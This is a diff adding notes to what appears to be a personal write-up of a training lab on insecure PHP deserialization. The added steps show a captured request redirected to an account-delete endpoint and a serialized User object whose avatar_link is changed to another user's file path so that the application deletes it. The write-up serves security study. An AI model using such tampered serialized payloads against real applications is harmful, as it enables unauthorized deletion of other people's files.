@@ -37,5 +37,7 @@ If you have source code access, you should start by looking for unserialize() an
 ----------------------------------------------------------------------------------------------------
 
 #3 Lab: Using application functionality to exploit insecure deserialization
-
-    
+ 
+     1. Capture /my-account request and send to repeater and modify the request to /my-account/delete and send
+     2. Normal request : O:4:"User":3:{s:8:"username";s:6:"wiener";s:12:"access_token";s:32:"h74kq9j39tegavxi3d2z9f2p9i3u9avx";s:11:"avatar_link";s:19:"users/wiener/avatar";}
+        Modified request : O:4:"User":3:{s:8:"username";s:6:"wiener";s:12:"access_token";s:32:"h74kq9j39tegavxi3d2z9f2p9i3u9avx";s:11:"avatar_link";s:23:"/home/carlos/morale.txt";}
